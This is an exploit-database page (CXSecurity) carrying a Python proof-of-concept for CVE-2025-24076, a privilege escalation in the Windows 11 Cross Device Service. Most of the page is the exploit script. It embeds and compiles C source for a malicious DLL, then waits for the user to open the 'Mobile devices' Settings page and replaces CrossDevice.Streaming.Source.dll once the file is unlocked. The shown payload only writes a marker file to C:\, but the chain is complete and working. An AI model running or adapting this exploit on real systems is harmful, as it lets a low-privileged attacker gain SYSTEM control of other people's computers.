---
title: Microsoft Windows 11 Version 24H2 Cross Device Service Elevation of Privilege
url: https://cxsecurity.com/issue/WLB-2025060013
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-16
fetch_date: 2025-10-06T22:52:13.523607
---

# Microsoft Windows 11 Version 24H2 Cross Device Service Elevation of Privilege

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Microsoft Windows 11 Version 24H2 Cross Device Service Elevation of Privilege** **2025.06.15**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2025-24076](https://cxsecurity.com/cveshow/CVE-2025-24076/ "Click to see CVE-2025-24076")**  CWE: **[CWE-284](https://cxsecurity.com/cwe/CWE-284 "Click to see CWE-284")** | |

#!/usr/bin/env python3
# Exploit Title: Microsoft Windows 11 Version 24H2 Cross Device Service - Elevation of Privilege
# Author: Mohammed Idrees Banyamer
# Instagram: @banyamer\_security
# GitHub: https://github.com/mbanyamer
# Date: 2025-06-06
# Tested on: Windows 11 Version 24H2 for x64-based Systems (10.0.26100.3476)
# CVE: CVE-2025-24076
#
# Affected Versions:
# - Windows 11 Version 24H2 (x64 and ARM64)
# - Windows 11 Version 23H2 (x64 and ARM64)
# - Windows 11 Version 22H2 (x64 and ARM64)
# - Windows Server 2025
# - Windows Server 2022 23H2 (Server Core installation)
#
# Type: Elevation of Privilege
# Platform: Microsoft Windows
# Author Country: Jordan
# CVSS v3.1 Score: 7.3 (Important)
# Weakness: CWE-284: Improper Access Control
# Attack Vector: Local
# Privileges Required: Low
# User Interaction: Required
# Scope: Unchanged
# Confidentiality, Integrity, Availability Impact: High
# Exploit Code Maturity: Unproven
# Remediation Level: Official Fix
# Description:
# This vulnerability affects Microsoft Windows 11 (various versions including 24H2, 23H2, and 22H2)
# and Windows Server 2025. It targets improper access control in the Windows Cross Device Service,
# allowing a low-privileged local attacker to overwrite a critical DLL file (CrossDevice.Streaming.Source.dll)
# in a writable directory. After triggering user interaction by opening Windows "Mobile devices" Settings,
# the attacker can replace the DLL with a malicious version, leading to SYSTEM privilege escalation.
#
# Steps of exploitation:
# 1. Verify the presence of the vulnerable DLL in the writable directory.
# 2. Build a malicious DLL that executes code with SYSTEM privileges upon loading.
# 3. Backup the original DLL to allow recovery.
# 4. Trigger the DLL load by instructing the user to open the "Mobile devices" Settings page.
# 5. Wait until the DLL is unlocked and replace it with the malicious DLL.
# 6. Achieve SYSTEM privileges when the system loads the malicious DLL.
#
# This exploit requires low privileges and user interaction but has low attack complexity
# and results in high impact due to full privilege escalation.
#
import os
import shutil
import time
from pathlib import Path
import subprocess
# Target DLL name based on vulnerability research
DLL\_NAME = "CrossDevice.Streaming.Source.dll"
TARGET\_PATH = Path("C:/ProgramData/CrossDevice")
MALICIOUS\_DLL = Path("malicious.dll")
BACKUP\_ORIGINAL\_DLL = Path("original\_backup.dll")
# C source code for malicious DLL
MALICIOUS\_C\_CODE = r'''
#include <windows.h>
#include <stdio.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
if (fdwReason == DLL\_PROCESS\_ATTACH) {
FILE \*file = fopen("C:\\poc\_only\_admin\_can\_write\_to\_c.txt", "w");
if (file) {
fputs("Exploit succeeded! You have SYSTEM privileges.\n", file);
fclose(file);
}
}
return TRUE;
}
'''
def build\_malicious\_dll():
print("[\*] Building malicious DLL from C source...")
c\_file = Path("malicious.c")
# Write C source code to file
with open(c\_file, "w") as f:
f.write(MALICIOUS\_C\_CODE)
# Compile DLL using gcc (MinGW)
compile\_cmd = [
"gcc", "-shared", "-o", str(MALICIOUS\_DLL), str(c\_file),
"-Wl,--subsystem,windows"
]
try:
subprocess.run(compile\_cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
print(f"[+] Malicious DLL built successfully: {MALICIOUS\_DLL}")
# Clean up C source file
c\_file.unlink()
return True
except subprocess.CalledProcessError as e:
print("[!] Failed to build malicious DLL.")
print("gcc output:", e.stderr.decode())
return False
def is\_vulnerable():
if not TARGET\_PATH.exists():
print("[!] Target directory not found.")
return False
dll\_path = TARGET\_PATH / DLL\_NAME
if not dll\_path.exists():
print("[!] Target DLL not found.")
return False
print("[+] System appears vulnerable, DLL found in a writable path.")
return True
def backup\_original():
dll\_path = TARGET\_PATH / DLL\_NAME
backup\_path = TARGET\_PATH / BACKUP\_ORIGINAL\_DLL
shutil.copyfile(dll\_path, backup\_path)
print(f"[+] Backup created at: {backup\_path}")
def replace\_with\_malicious():
dll\_path = TARGET\_PATH / DLL\_NAME
try:
shutil.copyfile(MALICIOUS\_DLL, dll\_path)
print("[+] Successfully replaced the DLL with malicious version.")
return True
except PermissionError:
print("[!] Cannot write to DLL. Make sure the process using it is stopped.")
return False
def monitor\_and\_replace():
dll\_path = TARGET\_PATH / DLL\_NAME
print("[\*] Monitoring DLL until it is unlocked...")
while True:
try:
with open(dll\_path, 'rb+') as f:
print("[+] File is unlocked. Attempting replacement...")
time.sleep(0.5)
return replace\_with\_malicious()
except PermissionError:
time.sleep(0.5)
def trigger\_com():
print("[\*] To trigger DLL load, please open Windows Settings -> Mobile devices")
input("[\*] After opening Settings, press Enter to continue...")
def main():
if not build\_malicious\_dll():
return
if not is\_vulnerable():
return
backup\_original()
trigger\_com()
success = monitor\_and\_replace()
if success:
print("[✓] Exploit completed successfully. Check results (e.g., C:\\poc\_only\_admin\_can\_write\_to\_c.txt).")
else:
print("[✗] Exploit failed.")
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060013)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{...